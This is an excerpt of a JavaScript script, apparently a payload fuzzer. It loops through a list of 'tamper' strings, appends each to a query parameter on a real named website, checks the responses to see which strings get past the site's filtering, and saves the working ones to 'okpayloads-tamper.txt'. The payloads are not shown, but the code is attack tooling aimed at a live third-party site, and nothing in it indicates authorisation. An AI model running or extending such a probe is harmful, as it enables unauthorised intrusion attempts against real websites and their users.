...
var baseurl = 'https://www.greatplacetowork.com/best-workplaces?view=scobar-';
...
async function test_unit() {
    ...
    if (tampi>=tampers.length){return;}
    var thistamp = tampers[tampi];
    ...
    try {
        ...
        if (responseBody.indexOf('scobar-,') > -1) {
            console.log(thistamp + ' faild');
            await delay(1000);
            await test_unit();
        } else {
            console.log('found: ' + thistamp);
            appendToFile('okpayloads-tamper.txt', thistamp + '\n');
            //return;
            await delay(1000);
            await test_unit();
        }
